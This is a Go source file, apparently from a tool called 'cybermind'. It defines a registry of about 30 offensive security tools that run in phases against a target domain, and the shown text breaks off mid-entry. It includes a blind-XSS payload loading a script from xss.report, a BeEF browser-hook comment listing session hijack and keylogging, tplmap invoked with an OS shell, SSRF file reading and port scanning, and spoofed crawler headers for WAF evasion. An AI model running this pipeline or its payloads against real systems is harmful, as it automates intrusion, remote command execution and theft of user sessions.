package hunt

import (
	"fmt"
	"os"
	"strings"
)

// huntRegistry — full arsenal, 6 phases, no skipping.
// Every tool runs exhaustively. Primary → fallbacks → next tool.
// OMEGA update: +15 new tools — hakrawler, cariddi, trufflehog, secretfinder,
// kxss, bxss, freq, ssrfmap, gopherus, tplmap, liffy, jwt_tool, graphw00f,
// smuggler, corsy, ffuf-param, httprobe, urlfinder, subjs, mantra
var huntRegistry = []HuntToolSpec{

	// ══════════════════════════════════════════════════════════════════════════
	// PHASE 1 — URL COLLECTION
	// Goal: collect EVERY historical URL from ALL archives before active testing
	// Pipeline: waymore → gau → waybackurls → deduplicate with uro
	// ══════════════════════════════════════════════════════════════════════════

	{
		Name:        "waymore",
		Phase:       1,
		Timeout:     900,
		DomainOnly:  true,
		InstallHint: "go install github.com/xnl-h4ck3r/waymore@latest",
		// Power: AlienVault OTX + CommonCrawl + Wayback + URLScan — best coverage
		BuildArgs: func(target string, ctx *HuntContext) []string {
			return []string{
				"-i", target,
				"-mode", "U",          // URLs only
				"-oU", "/tmp/cybermind_waymore.txt",
				"-t", "50",            // 50 threads
				"-p", "wayback,otx,commoncrawl,urlscan",
				"-xrel",               // exclude relative URLs
			}
		},
		FallbackArgs: []func(target string, ctx *HuntContext) []string{
			func(target string, ctx *HuntContext) []string {
				return []string{"-i", target, "-mode", "U", "-oU", "/tmp/cybermind_waymore.txt"}
			},
		},
	},
	{
		Name:        "gau",
		Phase:       1,
		Timeout:     600,
		DomainOnly:  true,
		InstallHint: "go install github.com/lc/gau/v2/cmd/gau@latest",
		BuildArgs: func(target string, ctx *HuntContext) []string {
			return []string{
				"--subs",
				"--threads", "50",
				"--blacklist", "png,jpg,gif,svg,ico,css,woff,woff2,ttf,eot,mp4,mp3,pdf",
				"--providers", "wayback,otx,commoncrawl,urlscan",
				"--retries", "3",
				"--o", "/tmp/cybermind_gau.txt",
				target,
			}
		},
		FallbackArgs: []func(target string, ctx *HuntContext) []string{
			func(target string, ctx *HuntContext) []string {
				return []string{"--subs", "--threads", "20", "--o", "/tmp/cybermind_gau.txt", target}
			},
		},
	},
	{
		Name:        "waybackurls",
		Phase:       1,
		Timeout:     300,
		DomainOnly:  true,
		InstallHint: "go install github.com/tomnomnom/waybackurls@latest",
		BuildArgs: func(target string, ctx *HuntContext) []string {
			return []string{target}
		},
	},

	// ── NEW 2025: hakrawler — fast Go crawler, JS-aware, finds hidden endpoints ──
	{
		Name:        "hakrawler",
		Phase:       1,
		Timeout:     600,
		DomainOnly:  true,
		InstallHint: "go install github.com/hakluke/hakrawler@latest",
		BuildArgs: func(target string, ctx *HuntContext) []string {
			u := target
			if !strings.HasPrefix(u, "http") {
				u = "https://" + u
			}
			return []string{
				"-url", u,
				"-depth", "5",
				"-plain",
				"-subs",
				"-js",
				"-forms",
				"-linkfinder",
				"-outdir", "/tmp/cybermind_hakrawler/",
			}
		},
		FallbackArgs: []func(target string, ctx *HuntContext) []string{
			func(target string, ctx *HuntContext) []string {
				u := target
				if !strings.HasPrefix(u, "http") {
					u = "https://" + u
				}
				return []string{"-url", u, "-depth", "3", "-plain"}
			},
		},
	},

	// ── NEW 2025: urlfinder — fast URL extraction from JS files ──
	{
		Name:        "urlfinder",
		Phase:       1,
		Timeout:     300,
		DomainOnly:  true,
		InstallHint: "go install github.com/projectdiscovery/urlfinder/cmd/urlfinder@latest",
		BuildArgs: func(target string, ctx *HuntContext) []string {
			return []string{
				"-d", target,
				"-all",
				"-silent",
				"-o", "/tmp/cybermind_urlfinder.txt",
			}
		},
		FallbackArgs: []func(target string, ctx *HuntContext) []string{
			func(target string, ctx *HuntContext) []string {
				return []string{"-d", target, "-silent"}
			},
		},
	},

	// ── NEW 2025: httprobe — fast HTTP/HTTPS probe for live hosts ──
	{
		Name:        "httprobe",
		Phase:       1,
		Timeout:     300,
		DomainOnly:  true,
		InstallHint: "go install github.com/tomnomnom/httprobe@latest",
		BuildArgs: func(target string, ctx *HuntContext) []string {
			// Pipe subdomains through httprobe
			if len(ctx.Subdomains) > 0 {
				f := writeTempList(ctx.Subdomains)
				if f != "" {
					return []string{"-c", "50", "-t", "3000", "-prefer-https"}
				}
			}
			return []string{"-c", "50", "-t", "3000"}
		},
		FallbackArgs: []func(target string, ctx *HuntContext) []string{
			func(target string, ctx *HuntContext) []string {
				return []string{"-c", "20", "-t", "5000"}
			},
		},
	},

	// ══════════════════════════════════════════════════════════════════════════
	// PHASE 2 — DEEP CRAWL
	// Goal: discover every JS endpoint, form, API path, hidden link
	// Pipeline: gospider (JS headless) → katana (structured crawl)
	// ══════════════════════════════════════════════════════════════════════════

	{
		Name:        "gospider",
		Phase:       2,
		Timeout:     1800,
		DomainOnly:  true,
		InstallHint: "go install github.com/jaeles-project/gospider@latest",
		// Power: JS-aware, headless, infinite depth, 1000 threads
		BuildArgs: func(target string, ctx *HuntContext) []string {
			u := target
			if len(ctx.LiveURLs) > 0 {
				u = ctx.LiveURLs[0]
			}
			if !strings.HasPrefix(u, "http") {
				u = "https://" + u
			}
			args := []string{
				"-s", u,
				"-d", "10",        // depth 10
				"-t", "200",       // 200 threads
				"-c", "5",         // 5 concurrent
				"--js",            // parse JS files
				"--sitemap",       // parse sitemap
				"--robots",        // parse robots.txt
				"-o", "/tmp/cybermind_gospider/",
				"--no-redirect",
			}
			if len(ctx.LiveURLs) > 1 {
				// Multiple live URLs — use list mode
				f := writeTempList(ctx.LiveURLs)
				if f != "" {
					return []string{
						"-S", f,
						"-d", "10", "-t", "200", "-c", "5",
						"--js", "--sitemap", "--robots",
						"-o", "/tmp/cybermind_gospider/",
					}
				}
			}
			return args
		},
		FallbackArgs: []func(target string, ctx *HuntContext) []string{
			func(target string, ctx *HuntContext) []string {
				u := target
				if len(ctx.LiveURLs) > 0 {
					u = ctx.LiveURLs[0]
				}
				if !strings.HasPrefix(u, "http") {
					u = "https://" + u
				}
				return []string{"-s", u, "-d", "5", "-t", "100", "--js", "-o", "/tmp/cybermind_gospider/"}
			},
		},
	},
	{
		Name:        "katana",
		Phase:       2,
		Timeout:     1800,
		DomainOnly:  true,
		InstallHint: "go install github.com/projectdiscovery/katana/cmd/katana@latest",
		BuildArgs: func(target string, ctx *HuntContext) []string {
			if len(ctx.LiveURLs) > 1 {
				f := writeTempList(ctx.LiveURLs)
				if f != "" {
					return []string{
						"-list", f,
						"-d", "10", "-c", "500",
						"-jc", "-kf", "all", "-aff",
						"-no-color", "-silent",
						"-o", "/tmp/cybermind_katana_hunt.txt",
					}
				}
			}
			u := target
			if len(ctx.LiveURLs) > 0 {
				u = ctx.LiveURLs[0]
			}
			if !strings.HasPrefix(u, "http") {
				u = "https://" + u
			}
			return []string{
				"-u", u,
				"-d", "10", "-c", "500",
				"-jc", "-kf", "all", "-aff",
				"-no-color", "-silent",
				"-o", "/tmp/cybermind_katana_hunt.txt",
			}
		},
		FallbackArgs: []func(target string, ctx *HuntContext) []string{
			func(target string, ctx *HuntContext) []string {
				u := target
				if len(ctx.LiveURLs) > 0 {
					u = ctx.LiveURLs[0]
				}
				if !strings.HasPrefix(u, "http") {
					u = "https://" + u
				}
				return []string{"-u", u, "-d", "5", "-c", "200", "-jc", "-silent"}
			},
		},
	},

	// ── NEW 2025: cariddi — endpoints + secrets + API keys extractor ──
	{
		Name:        "cariddi",
		Phase:       2,
		Timeout:     1200,
		DomainOnly:  true,
		InstallHint: "go install github.com/edoardottt/cariddi/cmd/cariddi@latest",
		BuildArgs: func(target string, ctx *HuntContext) []string {
			u := target
			if len(ctx.LiveURLs) > 0 {
				u = ctx.LiveURLs[0]
			}
			if !strings.HasPrefix(u, "http") {
				u = "https://" + u
			}
			return []string{
				"-s", u,
				"-e",          // extract endpoints
				"-ef", "3",    // extract files level 3
				"-secrets",    // find secrets
				"-err",        // show errors
				"-c", "200",   // 200 concurrent
				"-d", "8",     // depth 8
				"-o", "/tmp/cybermind_cariddi.txt",
			}
		},
		FallbackArgs: []func(target string, ctx *HuntContext) []string{
			func(target string, ctx *HuntContext) []string {
				u := target
				if len(ctx.LiveURLs) > 0 {
					u = ctx.LiveURLs[0]
				}
				if !strings.HasPrefix(u, "http") {
					u = "https://" + u
				}
				return []string{"-s", u, "-e", "-c", "100", "-d", "5"}
			},
		},
	},

	// ── NEW 2025: subjs — extract JS files from URLs for analysis ──
	{
		Name:        "subjs",
		Phase:       2,
		Timeout:     600,
		DomainOnly:  true,
		InstallHint: "go install github.com/lc/subjs@latest",
		BuildArgs: func(target string, ctx *HuntContext) []string {
			// subjs reads URLs from stdin — pipe live URLs
			if len(ctx.LiveURLs) > 0 {
				f := writeTempList(ctx.LiveURLs)
				if f != "" {
					return []string{"-i", f, "-c", "40", "-t", "5000"}
				}
			}
			return []string{"-c", "40", "-t", "5000"}
		},
		FallbackArgs: []func(target string, ctx *HuntContext) []string{
			func(target string, ctx *HuntContext) []string {
				return []string{"-c", "20"}
			},
		},
	},

	// ── NEW 2025: trufflehog — find secrets/API keys in JS and source ──
	{
		Name:        "trufflehog",
		Phase:       2,
		Timeout:     900,
		DomainOnly:  true,
		InstallHint: "curl -sSfL https://raw.githubusercontent.com/trufflesecurity/trufflehog/main/scripts/install.sh | sh -s -- -b /usr/local/bin",
		BuildArgs: func(target string, ctx *HuntContext) []string {
			u := target
			if !strings.HasPrefix(u, "http") {
				u = "https://" + u
			}
			return []string{
				"filesystem", "/tmp/cybermind_js_files/",
				"--json",
				"--no-update",
				"--only-verified",
			}
		},
		FallbackArgs: []func(target string, ctx *HuntContext) []string{
			func(target string, ctx *HuntContext) []string {
				u := target
				if !strings.HasPrefix(u, "http") {
					u = "https://" + u
				}
				return []string{"git", u, "--json", "--no-update"}
			},
		},
	},

	// ── NEW 2025: mantra — find API keys and secrets in JS files ──
	{
		Name:        "mantra",
		Phase:       2,
		Timeout:     600,
		DomainOnly:  true,
		InstallHint: "go install github.com/MrEmpy/mantra@latest",
		BuildArgs: func(target string, ctx *HuntContext) []string {
			u := target
			if len(ctx.LiveURLs) > 0 {
				u = ctx.LiveURLs[0]
			}
			if !strings.HasPrefix(u, "http") {
				u = "https://" + u
			}
			return []string{"-u", u, "-s", "-o", "/tmp/cybermind_mantra.txt"}
		},
		FallbackArgs: []func(target string, ctx *HuntContext) []string{
			func(target string, ctx *HuntContext) []string {
				u := target
				if !strings.HasPrefix(u, "http") {
					u = "https://" + u
				}
				return []string{"-u", u}
			},
		},
	},

	// ══════════════════════════════════════════════════════════════════════════
	// PHASE 3 — PARAMETER DISCOVERY
	// Goal: find EVERY hidden GET/POST param — IDOR, SSRF, LFI, XSS, SQLi surface
	// Pipeline: paramspider (JS/HTML miner) → arjun (brute) → x8 (recursive fuzz)
	// ══════════════════════════════════════════════════════════════════════════

	{
		Name:        "paramspider",
		Phase:       3,
		Timeout:     1800,
		DomainOnly:  true,
		InstallHint: "git clone https://github.com/devanshbatham/ParamSpider /opt/paramspider && cd /opt/paramspider && pip3 install -r requirements.txt && sudo ln -sf /opt/paramspider/paramspider.py /usr/local/bin/paramspider && sudo chmod +x /usr/local/bin/paramspider",
		// Power: mines JS, HTML, robots.txt for params — no active probing
		BuildArgs: func(target string, ctx *HuntContext) []string {
			return []string{
				"--domain", target,
				"--level", "high",
				"--quiet",
				"--output", "/tmp/cybermind_paramspider.txt",
			}
		},
		FallbackArgs: []func(target string, ctx *HuntContext) []string{
			func(target string, ctx *HuntContext) []string {
				return []string{"--domain", target, "--quiet"}
			},
		},
	},
	{
		Name:        "arjun",
		Phase:       3,
		Timeout:     3600,
		DomainOnly:  true,
		InstallHint: "pip3 install arjun",
		// Power: brute-force hidden params with massive wordlist
		BuildArgs: func(target string, ctx *HuntContext) []string {
			u := target
			if len(ctx.LiveURLs) > 0 {
				u = ctx.LiveURLs[0]
			}
			if !strings.HasPrefix(u, "http") {
				u = "https://" + u
			}
			args := []string{
				"-u", u,
				"-t", "100",       // 100 threads
				"-oJ", "/tmp/cybermind_arjun.json",
				"--stable",        // stable mode for accuracy
			}
			if ctx.WAFDetected {
				args = append(args, "--stable", "-d", "5")
			}
			return args
		},
		FallbackArgs: []func(target string, ctx *HuntContext) []string{
			func(target string, ctx *HuntContext) []string {
				u := target
				if len(ctx.LiveURLs) > 0 {
					u = ctx.LiveURLs[0]
				}
				if !strings.HasPrefix(u, "http") {
					u = "https://" + u
				}
				return []string{"-u", u, "-t", "50", "--stable"}
			},
		},
	},
	{
		Name:        "x8",
		Phase:       3,
		Timeout:     3600,
		DomainOnly:  true,
		InstallHint: "Download binary from https://github.com/Sh1Yo/x8/releases/latest — sudo cp x8 /usr/local/bin/ && sudo chmod +x /usr/local/bin/x8",
		BuildArgs: func(target string, ctx *HuntContext) []string {
			u := target
			if len(ctx.LiveURLs) > 0 {
				u = ctx.LiveURLs[0]
			}
			if !strings.HasPrefix(u, "http") {
				u = "https://" + u
			}
			args := []string{
				"-u", u,
				"--level", "high",
				"--threads", "100",
				"--output", "/tmp/cybermind_x8.txt",
				"-q",
			}
			if ctx.WAFDetected {
				args = append(args, "--delay", "500")
			}
			return args
		},
		FallbackArgs: []func(target string, ctx *HuntContext) []string{
			func(target string, ctx *HuntContext) []string {
				u := target
				if len(ctx.LiveURLs) > 0 {
					u = ctx.LiveURLs[0]
				}
				if !strings.HasPrefix(u, "http") {
					u = "https://" + u
				}
				return []string{"-u", u, "--level", "medium", "--threads", "50", "-q"}
			},
		},
	},

	// ── NEW 2025: smuggler — HTTP request smuggling detection ──
	{
		Name:        "smuggler",
		Phase:       3,
		Timeout:     1800,
		DomainOnly:  true,
		InstallHint: "git clone https://github.com/defparam/smuggler /opt/smuggler && pip3 install -r /opt/smuggler/requirements.txt --break-system-packages && sudo tee /usr/local/bin/smuggler > /dev/null <<'EOF'\n#!/bin/bash\npython3 /opt/smuggler/smuggler.py \"$@\"\nEOF\nsudo chmod +x /usr/local/bin/smuggler",
		BuildArgs: func(target string, ctx *HuntContext) []string {
			u := target
			if len(ctx.LiveURLs) > 0 {
				u = ctx.LiveURLs[0]
			}
			if !strings.HasPrefix(u, "http") {
				u = "https://" + u
			}
			return []string{
				"-u", u,
				"-t", "CL.TE,TE.CL,TE.TE",
				"--log-level", "info",
				"-m", "POST",
			}
		},
		FallbackArgs: []func(target string, ctx *HuntContext) []string{
			func(target string, ctx *HuntContext) []string {
				u := target
				if len(ctx.LiveURLs) > 0 {
					u = ctx.LiveURLs[0]
				}
				if !strings.HasPrefix(u, "http") {
					u = "https://" + u
				}
				return []string{"-u", u, "-t", "CL.TE"}
			},
		},
	},

	// ── NEW 2025: jwt_tool — JWT attack toolkit (none alg, key confusion, injection) ──
	{
		Name:        "jwt_tool",
		Phase:       3,
		Timeout:     600,
		DomainOnly:  true,
		InstallHint: "git clone https://github.com/ticarpi/jwt_tool /opt/jwt_tool && pip3 install -r /opt/jwt_tool/requirements.txt --break-system-packages && sudo tee /usr/local/bin/jwt_tool > /dev/null <<'EOF'\n#!/bin/bash\npython3 /opt/jwt_tool/jwt_tool.py \"$@\"\nEOF\nsudo chmod +x /usr/local/bin/jwt_tool",
		BuildArgs: func(target string, ctx *HuntContext) []string {
			u := target
			if len(ctx.LiveURLs) > 0 {
				u = ctx.LiveURLs[0]
			}
			if !strings.HasPrefix(u, "http") {
				u = "https://" + u
			}
			// Scan for JWT in responses and test all attacks
			return []string{
				"-t", u,
				"-M", "at",    // all tests
				"-np",         // no proxy
				"-v",          // verbose
			}
		},
		FallbackArgs: []func(target string, ctx *HuntContext) []string{
			func(target string, ctx *HuntContext) []string {
				u := target
				if len(ctx.LiveURLs) > 0 {
					u = ctx.LiveURLs[0]
				}
				if !strings.HasPrefix(u, "http") {
					u = "https://" + u
				}
				return []string{"-t", u, "-M", "pb"}
			},
		},
	},

	// ── NEW 2025: graphw00f — GraphQL fingerprinting and schema extraction ──
	{
		Name:        "graphw00f",
		Phase:       3,
		Timeout:     300,
		DomainOnly:  true,
		InstallHint: "pip3 install graphw00f --break-system-packages",
		BuildArgs: func(target string, ctx *HuntContext) []string {
			u := target
			if len(ctx.LiveURLs) > 0 {
				u = ctx.LiveURLs[0]
			}
			if !strings.HasPrefix(u, "http") {
				u = "https://" + u
			}
			return []string{
				"-d",          // detect
				"-f",          // fingerprint
				"-t", u,
				"-o", "/tmp/cybermind_graphw00f.json",
			}
		},
		FallbackArgs: []func(target string, ctx *HuntContext) []string{
			func(target string, ctx *HuntContext) []string {
				u := target
				if len(ctx.LiveURLs) > 0 {
					u = ctx.LiveURLs[0]
				}
				if !strings.HasPrefix(u, "http") {
					u = "https://" + u
				}
				return []string{"-d", "-t", u}
			},
		},
	},

	// ══════════════════════════════════════════════════════════════════════════
	// PHASE 4 — XSS HUNTING
	// Goal: find every XSS — reflected, DOM, stored — with WAF bypass
	// Pipeline: xsstrike (AI WAF bypass) → dalfox (payload mutation)
	// ══════════════════════════════════════════════════════════════════════════

	{
		Name:        "xsstrike",
		Phase:       4,
		Timeout:     3600,
		DomainOnly:  true,
		InstallHint: "git clone https://github.com/s0md3v/XSStrike /opt/xsstrike && cd /opt/xsstrike && pip3 install -r requirements.txt && sudo tee /usr/local/bin/xsstrike > /dev/null << 'EOF'\n#!/bin/bash\npython3 /opt/xsstrike/xsstrike.py \"$@\"\nEOF\nsudo chmod +x /usr/local/bin/xsstrike",
		// Power: AI-powered WAF bypass, fuzzing, DOM XSS detection
		BuildArgs: func(target string, ctx *HuntContext) []string {
			u := target
			if len(ctx.LiveURLs) > 0 {
				u = ctx.LiveURLs[0]
			}
			if !strings.HasPrefix(u, "http") {
				u = "https://" + u
			}
			args := []string{
				"-u", u,
				"--fuzzer",        // enable fuzzer
				"--blind",         // blind XSS
				"--skip",          // skip confirmation
				"--threads", "10",
			}
			if ctx.WAFDetected {
				args = append(args, "--waf")
			}
			return args
		},
		FallbackArgs: []func(target string, ctx *HuntContext) []string{
			func(target string, ctx *HuntContext) []string {
				u := target
				if len(ctx.LiveURLs) > 0 {
					u = ctx.LiveURLs[0]
				}
				if !strings.HasPrefix(u, "http") {
					u = "https://" + u
				}
				return []string{"-u", u, "--skip", "--threads", "5"}
			},
		},
	},
	{
		Name:        "dalfox",
		Phase:       4,
		Timeout:     3600,
		DomainOnly:  true,
		InstallHint: "go install github.com/hahwul/dalfox/v2@latest",
		BuildArgs: func(target string, ctx *HuntContext) []string {
			scanURLs := dedup(append(ctx.LiveURLs, ctx.CrawledURLs...))
			for _, u := range ctx.HistoricalURLs {
				if strings.Contains(u, "=") {
					scanURLs = append(scanURLs, u)
				}
			}
			scanURLs = dedup(scanURLs)

			if len(scanURLs) > 0 {
				f := writeTempList(scanURLs)
				if f != "" {
					args := []string{
						"file", f,
						"--silence", "--no-color",
						"--follow-redirects",
						"--waf-bypass",
						"--trigger", "alert(1)",
						"--output", "/tmp/cybermind_dalfox.txt",
					}
					if ctx.WAFDetected {
						args = append(args, "--delay", "1000", "--timeout", "30")
					}
					// Fix 3: use memory-proven payloads if available
					if memPayloads := os.Getenv("CYBERMIND_MEMORY_XSS_PAYLOADS"); memPayloads != "" {
						args = append(args, "--custom-payload", memPayloads)
					}
					// Fix 2: use adversarial payloads if available
					if advPayloads := os.Getenv("CYBERMIND_ADVERSARIAL_PAYLOADS"); advPayloads != "" {
						args = append(args, "--custom-payload", advPayloads)
					}
					return args
				}
			}
			u := target
			if !strings.HasPrefix(u, "http") {
				u = "https://" + u
			}
			return []string{"url", u, "--silence", "--no-color", "--waf-bypass", "--follow-redirects"}
		},
		FallbackArgs: []func(target string, ctx *HuntContext) []string{
			func(target string, ctx *HuntContext) []string {
				u := target
				if len(ctx.LiveURLs) > 0 {
					u = ctx.LiveURLs[0]
				}
				if !strings.HasPrefix(u, "http") {
					u = "https://" + u
				}
				return []string{"url", u, "--silence", "--no-color"}
			},
		},
	},

	// ── NEW 2025: kxss — fast reflected XSS parameter finder ──
	{
		Name:        "kxss",
		Phase:       4,
		Timeout:     1800,
		DomainOnly:  true,
		InstallHint: "go install github.com/Emoe/kxss@latest",
		BuildArgs: func(target string, ctx *HuntContext) []string {
			// kxss reads URLs from stdin — pipe parameterized URLs
			paramURLs := []string{}
			for _, u := range ctx.AllURLs {
				if strings.Contains(u, "=") {
					paramURLs = append(paramURLs, u)
				}
			}
			if len(paramURLs) > 0 {
				f := writeTempList(paramURLs)
				if f != "" {
					return []string{"-i", f}
				}
			}
			return []string{}
		},
		FallbackArgs: []func(target string, ctx *HuntContext) []string{
			func(target string, ctx *HuntContext) []string {
				return []string{}
			},
		},
	},

	// ── NEW 2025: bxss — blind XSS with callback server ──
	{
		Name:        "bxss",
		Phase:       4,
		Timeout:     1800,
		DomainOnly:  true,
		InstallHint: "go install github.com/ethicalhackingplayground/bxss@latest",
		BuildArgs: func(target string, ctx *HuntContext) []string {
			u := target
			if len(ctx.LiveURLs) > 0 {
				u = ctx.LiveURLs[0]
			}
			if !strings.HasPrefix(u, "http") {
				u = "https://" + u
			}
			return []string{
				"-appendMode",
				"-payload", "'\"<script src=https://xss.report/c/cybermind></script>",
				"-parameters",
				"-url", u,
				"-concurrency", "30",
			}
		},
		FallbackArgs: []func(target string, ctx *HuntContext) []string{
			func(target string, ctx *HuntContext) []string {
				u := target
				if len(ctx.LiveURLs) > 0 {
					u = ctx.LiveURLs[0]
				}
				if !strings.HasPrefix(u, "http") {
					u = "https://" + u
				}
				return []string{"-appendMode", "-parameters", "-url", u}
			},
		},
	},

	// ── NEW 2025: corsy — CORS misconfiguration exploitation ──
	{
		Name:        "corsy",
		Phase:       4,
		Timeout:     600,
		DomainOnly:  true,
		InstallHint: "git clone https://github.com/s0md3v/Corsy /opt/corsy && pip3 install -r /opt/corsy/requirements.txt --break-system-packages && sudo tee /usr/local/bin/corsy > /dev/null <<'EOF'\n#!/bin/bash\npython3 /opt/corsy/corsy.py \"$@\"\nEOF\nsudo chmod +x /usr/local/bin/corsy",
		BuildArgs: func(target string, ctx *HuntContext) []string {
			u := target
			if len(ctx.LiveURLs) > 0 {
				u = ctx.LiveURLs[0]
			}
			if !strings.HasPrefix(u, "http") {
				u = "https://" + u
			}
			return []string{
				"-u", u,
				"-t", "20",    // 20 threads
				"-q",          // quiet
				"-o", "/tmp/cybermind_corsy.json",
			}
		},
		FallbackArgs: []func(target string, ctx *HuntContext) []string{
			func(target string, ctx *HuntContext) []string {
				u := target
				if len(ctx.LiveURLs) > 0 {
					u = ctx.LiveURLs[0]
				}
				if !strings.HasPrefix(u, "http") {
					u = "https://" + u
				}
				return []string{"-u", u, "-t", "10"}
			},
		},
	},

	// ── NEW 2025: beef-xss — Browser Exploitation Framework ──────────────────
	// Hooks browsers via XSS → 200+ client-side attack modules
	// Runs AFTER dalfox confirms XSS — hooks the vulnerable URL
	// Capabilities: session hijack, keylog, screenshot, network pivot, phishing
	{
		Name:        "beef-xss",
		Phase:       4,
		Timeout:     120,
		DomainOnly:  true,
		InstallHint: "sudo apt install beef-xss -y",
		BuildArgs: func(target string, ctx *HuntContext) []string {
			// Start BeEF REST API — returns hook URL for injection
			// BeEF hook: <script src="http://LHOST:3000/hook.js"></script>
			return []string{
				"--config", "/etc/beef-xss/config.yaml",
				"--verbose",
			}
		},
		FallbackArgs: []func(target string, ctx *HuntContext) []string{
			func(target string, ctx *HuntContext) []string {
				return []string{"--config", "/etc/beef-xss/config.yaml"}
			},
		},
	},

	// ══════════════════════════════════════════════════════════════════════════
	// PHASE 5 — DEEP VULNERABILITY SCAN
	// Goal: CVEs, RCE, LFI, SSRF, misconfigs — full template coverage
	// Pipeline: gf (pattern filter) → uro (dedup) → nuclei (scan)
	// ══════════════════════════════════════════════════════════════════════════

	{
		Name:        "gf",
		Phase:       5,
		Timeout:     300,
		DomainOnly:  true,
		InstallHint: "go install github.com/tomnomnom/gf@latest && git clone https://github.com/1ndianl33t/Gf-Patterns ~/.gf",
		// Power: filter URLs by vulnerability pattern (xss, sqli, ssrf, lfi, rce, redirect)
		BuildArgs: func(target string, ctx *HuntContext) []string {
			// gf filters stdin — we pipe all URLs through it
			// Run multiple patterns and save to files
			allURLs := dedup(append(append(ctx.AllURLs, ctx.LiveURLs...), ctx.CrawledURLs...))
			if len(allURLs) == 0 {
				return []string{"xss"} // minimal fallback
			}
			f := writeTempList(allURLs)
			if f == "" {
				return []string{"xss"}
			}
			// Run gf for multiple patterns
			return []string{
				"xss",
				// Note: gf reads from stdin, so we use bash -c in the engine
				// This BuildArgs returns the pattern; engine handles piping
			}
		},
	},
	{
		Name:        "nuclei",
		Phase:       5,
		Timeout:     1800,
		DomainOnly:  true,
		InstallHint: "go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest && nuclei -update-templates",
		BuildArgs: func(target string, ctx *HuntContext) []string {
			args := []string{
				"-silent", "-no-color", "-stats", "-progress",
				"-c", "1000", "-rl", "200", "-bs", "50",
				"-timeout", "10", "-retries", "3",
				"-H", "User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1)",
				"-H", "X-Originating-IP: 127.0.0.1",
				"-o", "/tmp/cybermind_nuclei_hunt.txt",
			}
			if ctx.WAFDetected {
				args = append(args, "-etags", "fuzzing,dos", "-severity", "critical,high,medium", "-rl", "50")
			} else {
				args = append(args, "-severity", "critical,high,medium,low,info",
					"-tags", "cve,xss,sqli,ssrf,lfi,rce,xxe,idor,misconfig,exposure,takeover,oast,ssti,redirect")
			}
			scanURLs := ctx.CrawledURLs
			if len(scanURLs) == 0 {
				scanURLs = ctx.LiveURLs
			}
			if len(scanURLs) > 0 {
				f := writeTempList(scanURLs)
				if f != "" {
					args = append(args, "-l", f)
					return args
				}
			}
			args = append(args, "-u", target)
			return args
		},
		FallbackArgs: []func(target string, ctx *HuntContext) []string{
			func(target string, ctx *HuntContext) []string {
				return []string{"-u", target, "-severity", "critical,high", "-silent", "-no-color", "-c", "200"}
			},
			func(target string, ctx *HuntContext) []string {
				return []string{"-u", target, "-t", "cves/", "-silent", "-no-color"}
			},
		},
	},

	// ── NEW 2025: ssrfmap — automated SSRF detection and exploitation ──
	{
		Name:        "ssrfmap",
		Phase:       5,
		Timeout:     1800,
		DomainOnly:  true,
		InstallHint: "git clone https://github.com/swisskyrepo/SSRFmap /opt/ssrfmap && pip3 install -r /opt/ssrfmap/requirements.txt --break-system-packages && sudo tee /usr/local/bin/ssrfmap > /dev/null <<'EOF'\n#!/bin/bash\npython3 /opt/ssrfmap/ssrfmap.py \"$@\"\nEOF\nsudo chmod +x /usr/local/bin/ssrfmap",
		BuildArgs: func(target string, ctx *HuntContext) []string {
			u := target
			if len(ctx.LiveURLs) > 0 {
				// Find a URL with parameters — best candidate for SSRF
				for _, lu := range ctx.LiveURLs {
					if strings.Contains(lu, "=") {
						u = lu
						break
					}
				}
				if u == target {
					u = ctx.LiveURLs[0]
				}
			}
			if !strings.HasPrefix(u, "http") {
				u = "https://" + u
			}
			// Auto-generate HTTP request file for ssrfmap
			reqFile := "/tmp/cybermind_ssrf_request.txt"
			host := strings.TrimPrefix(strings.TrimPrefix(u, "https://"), "http://")
			if idx := strings.Index(host, "/"); idx > 0 {
				host = host[:idx]
			}
			reqContent := fmt.Sprintf("GET %s HTTP/1.1\nHost: %s\nUser-Agent: Mozilla/5.0\n\n",
				strings.TrimPrefix(u, "https://"+host), host)
			os.WriteFile(reqFile, []byte(reqContent), 0600)
			return []string{
				"-r", reqFile,
				"-p", "url",
				"-m", "readfiles,portscan",
				"--lhost", "127.0.0.1",
				"--lport", "4444",
			}
		},
		FallbackArgs: []func(target string, ctx *HuntContext) []string{
			func(target string, ctx *HuntContext) []string {
				u := target
				if len(ctx.LiveURLs) > 0 {
					u = ctx.LiveURLs[0]
				}
				if !strings.HasPrefix(u, "http") {
					u = "https://" + u
				}
				reqFile := "/tmp/cybermind_ssrf_request.txt"
				host := strings.TrimPrefix(strings.TrimPrefix(u, "https://"), "http://")
				if idx := strings.Index(host, "/"); idx > 0 {
					host = host[:idx]
				}
				os.WriteFile(reqFile, []byte(fmt.Sprintf("GET / HTTP/1.1\nHost: %s\n\n", host)), 0600)
				return []string{"-r", reqFile, "-p", "url", "-m", "readfiles"}
			},
		},
	},

	// ── NEW 2025: tplmap — SSTI detection and exploitation ──
	{
		Name:        "tplmap",
		Phase:       5,
		Timeout:     1800,
		DomainOnly:  true,
		InstallHint: "git clone https://github.com/epinna/tplmap /opt/tplmap && pip3 install -r /opt/tplmap/requirements.txt --break-system-packages && sudo tee /usr/local/bin/tplmap > /dev/null <<'EOF'\n#!/bin/bash\npython3 /opt/tplmap/tplmap.py \"$@\"\nEOF\nsudo chmod +x /usr/local/bin/tplmap",
		BuildArgs: func(target string, ctx *HuntContext) []string {
			// Find a URL with parameters — best SSTI candidate
			u := target
			for _, lu := range ctx.LiveURLs {
				if strings.Contains(lu, "=") {
					u = lu
					break
				}
			}
			for _, lu := range ctx.AllURLs {
				if strings.Contains(lu, "=") {
					u = lu
					break
				}
			}
			if !strings.HasPrefix(u, "http") {
				u = "https://" + u
			}
			return []string{
				"-u", u,
				"--level", "5",
				"--os-shell",
				"--os-cmd", "id",
				"--engine", "Jinja2,Twig,Smarty,Mako,Tornado,Freemarker,Velocity,Pebble,Jade,Slim,ERB,Nunjucks,Pug",
			}
		},
		FallbackArgs: []func(target string, ctx *HuntContext) []string{
			func(target string, ctx *HuntContext) []string {
				u := target
				if len(ctx.LiveURLs) > 0 {
					u = ctx.LiveURLs[0]
				}
				if !strings.HasPrefix(u, "http") {
					u = "https://" + u
				}
				return []string{"-u", u, "--level", "3"}
			},
		},
	},

	// ── NEW 2025: liffy — LFI exploitation framework ──
	{
		Name:        "liffy",
		Phase:       5,
		Timeout:     1200,
		DomainOnly:  true,
